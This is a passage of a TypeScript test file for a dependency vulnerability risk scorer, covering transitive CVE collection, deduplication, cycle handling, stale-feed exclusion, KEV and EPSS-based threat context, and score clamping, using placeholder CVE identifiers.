    const graph = new Map<string, DepNode>([
      ["root", { name: "root", vulns: [vuln1], directDeps: ["child"] }],
      ["child", { name: "child", vulns: [vuln2], directDeps: ["grandchild"] }],
      ["grandchild", { name: "grandchild", vulns: [vuln3], directDeps: [] }]
    ]);
    return graph;
  }

  it("collects all transitive vulnerabilities from root", () => {
    const graph = makeGraph();
    const vulns = transitiveVulnScan("root", graph);
    expect(vulns).toHaveLength(3);
    const ids = vulns.map((v) => v.cveId);
    expect(ids).toContain("CVE-ROOT-001");
    expect(ids).toContain("CVE-CHILD-001");
    expect(ids).toContain("CVE-GRANDCHILD-001");
  });

  it("collects only direct + own vulns when starting from child", () => {
    const graph = makeGraph();
    const vulns = transitiveVulnScan("child", graph);
    expect(vulns).toHaveLength(2);
    const ids = vulns.map((v) => v.cveId);
    expect(ids).toContain("CVE-CHILD-001");
    expect(ids).toContain("CVE-GRANDCHILD-001");
    expect(ids).not.toContain("CVE-ROOT-001");
  });

  it("deduplicates CVEs that appear in multiple nodes", () => {
    const sharedVuln = makeVuln({ cveId: "CVE-SHARED-001", epssPercentile: 0.60 });
    const graph = new Map<string, DepNode>([
      ["root", { name: "root", vulns: [sharedVuln], directDeps: ["child"] }],
      ["child", { name: "child", vulns: [sharedVuln], directDeps: [] }]
    ]);
    const vulns = transitiveVulnScan("root", graph);
    expect(vulns.filter((v) => v.cveId === "CVE-SHARED-001")).toHaveLength(1);
  });

  it("handles cycles without infinite loop", () => {
    const vuln = makeVuln({ cveId: "CVE-CYCLE-001" });
    const graph = new Map<string, DepNode>([
      ["a", { name: "a", vulns: [vuln], directDeps: ["b"] }],
      ["b", { name: "b", vulns: [], directDeps: ["a"] }]
    ]);
    expect(() => transitiveVulnScan("a", graph)).not.toThrow();
    const vulns = transitiveVulnScan("a", graph);
    expect(vulns).toHaveLength(1);
  });

  it("returns empty array for unknown root", () => {
    const graph = new Map<string, DepNode>();
    expect(transitiveVulnScan("nonexistent", graph)).toHaveLength(0);
  });

  it("excludes stale vulns from transitive scan", () => {
    const fresh = makeVuln({ cveId: "CVE-FRESH-001", feedUpdatedAt: FRESH_DATE });
    const stale = makeVuln({ cveId: "CVE-STALE-001", feedUpdatedAt: STALE_DATE });
    const graph = new Map<string, DepNode>([
      ["root", { name: "root", vulns: [fresh, stale], directDeps: [] }]
    ]);
    const vulns = transitiveVulnScan("root", graph);
    expect(vulns).toHaveLength(1);
    expect(vulns[0]!.cveId).toBe("CVE-FRESH-001");
  });
});

// ---------------------------------------------------------------------------
// buildActiveThreatContext
// ---------------------------------------------------------------------------

describe("buildActiveThreatContext", () => {
  it("returns zero context when no vulns provided", () => {
    const ctx = buildActiveThreatContext([], 0);
    expect(ctx.exploitedCVEs).toHaveLength(0);
    expect(ctx.unfixed_count).toBe(0);
    expect(ctx.highest_epss_pct).toBe(0);
    expect(ctx.risk_adjusted_from_base).toBe(0);
  });

  it("lists exploited CVEs from KEV active/widespread", () => {
    const vulns: ActiveVulnerability[] = [
      makeVuln({ cveId: "CVE-A", isKev: true, exploitMaturity: "active-exploitation" }),
      makeVuln({ cveId: "CVE-B", isKev: true, exploitMaturity: "widespread" }),
      makeVuln({ cveId: "CVE-C", isKev: true, exploitMaturity: "proof-of-concept" }),
      makeVuln({ cveId: "CVE-D", isKev: false })
    ];
    const ctx = buildActiveThreatContext(vulns, 40);
    expect(ctx.exploitedCVEs).toContain("CVE-A");
    expect(ctx.exploitedCVEs).toContain("CVE-B");
    expect(ctx.exploitedCVEs).not.toContain("CVE-C");
    expect(ctx.exploitedCVEs).not.toContain("CVE-D");
  });

  it("counts unfixed vulnerabilities correctly", () => {
    const vulns: ActiveVulnerability[] = [
      makeVuln({ cveId: "CVE-1", patchedVersion: undefined }),                          // no fix → unfixed
      makeVuln({ cveId: "CVE-2", patchedVersion: "2.0", patchAvailableButUnmerged: true }),  // unmerged → unfixed
      makeVuln({ cveId: "CVE-3", patchedVersion: "2.0", patchAvailableButUnmerged: false })  // applied → fixed
    ];
    const ctx = buildActiveThreatContext(vulns, 0);
    expect(ctx.unfixed_count).toBe(2);
  });

  it("reports highest EPSS percentile across all fresh vulns", () => {
    const vulns: ActiveVulnerability[] = [
      makeVuln({ cveId: "CVE-1", epssPercentile: 0.45 }),
      makeVuln({ cveId: "CVE-2", epssPercentile: 0.92 }),
      makeVuln({ cveId: "CVE-3", epssPercentile: 0.70 }),
      makeVuln({ cveId: "CVE-4", epssPercentile: 0.85, feedUpdatedAt: STALE_DATE }) // stale — excluded
    ];
    const ctx = buildActiveThreatContext(vulns, 0);
    expect(ctx.highest_epss_pct).toBe(0.92);
  });

  it("reflects the passed risk_adjusted_from_base value", () => {
    const ctx = buildActiveThreatContext([], 42);
    expect(ctx.risk_adjusted_from_base).toBe(42);
  });

  it("stale vulns are excluded from context", () => {
    const vulns: ActiveVulnerability[] = [
      makeVuln({ cveId: "CVE-STALE", isKev: true, exploitMaturity: "active-exploitation", feedUpdatedAt: STALE_DATE }),
      makeVuln({ cveId: "CVE-FRESH", epssPercentile: 0.50 })
    ];
    const ctx = buildActiveThreatContext(vulns, 0);
    expect(ctx.exploitedCVEs).toHaveLength(0);
    expect(ctx.highest_epss_pct).toBe(0.50);
  });
});

// ---------------------------------------------------------------------------
// Feed staleness — >30 days = ignore
// ---------------------------------------------------------------------------

describe("feed staleness guard (>30 days = ignore)", () => {
  it("scoreWithActiveVulnerabilities ignores stale entries entirely", () => {
    const staleKev = makeVuln({
      cveId: "CVE-OLD-001",
      isKev: true,
      exploitMaturity: "active-exploitation",
      epssPercentile: 0.99,
      feedUpdatedAt: STALE_DATE
    });

    const withStale = scoreWithActiveVulnerabilities([], undefined, [staleKev]);
    const withNone = scoreWithActiveVulnerabilities([], undefined, []);

    // Stale entry should have zero effect on score
    expect(withStale.riskScore).toBe(withNone.riskScore);
    // And must NOT force critical
    expect(withStale.riskLevel).toBe(withNone.riskLevel);
    // activeThreatContext should be empty
    expect(withStale.activeThreatContext.exploitedCVEs).toHaveLength(0);
  });

  it("fresh and stale mixed — only fresh entries contribute", () => {
    const stale = makeVuln({ cveId: "CVE-STALE", epssPercentile: 0.95, feedUpdatedAt: STALE_DATE, patchedVersion: "1.0.0", patchAvailableButUnmerged: false });
    const fresh = makeVuln({ cveId: "CVE-FRESH", epssPercentile: 0.95, feedUpdatedAt: FRESH_DATE, patchedVersion: "1.0.0", patchAvailableButUnmerged: false });

    const withBoth = scoreWithActiveVulnerabilities([], undefined, [stale, fresh]);
    const withFreshOnly = scoreWithActiveVulnerabilities([], undefined, [fresh]);

    expect(withBoth.riskScore).toBe(withFreshOnly.riskScore);
  });
});

// ---------------------------------------------------------------------------
// scoreWithActiveVulnerabilities — activeThreatContext integration
// ---------------------------------------------------------------------------

describe("scoreWithActiveVulnerabilities — activeThreatContext", () => {
  it("returns activeThreatContext with zero values for empty vuln list", () => {
    const result = scoreWithActiveVulnerabilities([], undefined, []);
    expect(result.activeThreatContext.exploitedCVEs).toHaveLength(0);
    expect(result.activeThreatContext.unfixed_count).toBe(0);
    expect(result.activeThreatContext.highest_epss_pct).toBe(0);
    expect(result.activeThreatContext.risk_adjusted_from_base).toBe(0);
  });

  it("risk_adjusted_from_base reflects total boost from active vulns", () => {
    const vulns: ActiveVulnerability[] = [
      makeVuln({ epssPercentile: 0.80, patchedVersion: "1.0.0", patchAvailableButUnmerged: false }), // +15
      makeVuln({ cveId: "CVE-2025-0002", isKev: true, exploitMaturity: "active-exploitation", epssPercentile: 0, patchedVersion: "2.0.0", patchAvailableButUnmerged: false }) // +20
    ];
    const result = scoreWithActiveVulnerabilities([], undefined, vulns);
    expect(result.activeThreatContext.risk_adjusted_from_base).toBe(35); // 15 + 20
  });

  it("score is clamped to 100 even when adjustments are large", () => {
    const manyVulns: ActiveVulnerability[] = Array.from({ length: 10 }, (_, i) =>
      makeVuln({
        cveId: `CVE-2025-${i}`,
        epssPercentile: 0.99,
        isKev: true,
        exploitMaturity: "widespread",
        patchedVersion: undefined
      })
    );
    const result = scoreWithActiveVulnerabilities([], undefined, manyVulns);
    expect(result.riskScore).toBeLessThanOrEqual(100);
  });
});
